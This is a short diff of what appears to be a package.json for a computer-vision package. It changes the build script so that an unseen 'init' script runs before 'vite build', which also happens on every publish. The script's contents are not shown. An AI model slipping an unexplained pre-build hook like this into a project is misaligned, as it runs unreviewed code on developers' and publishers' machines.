@@ -54,7 +54,7 @@
     "computer-vision"
   ],
   "scripts": {
-    "build": "vite build",
+    "build": "node init && vite build",
     "typecheck": "tsc --noEmit",
     "prepublishOnly": "npm run build"
   },
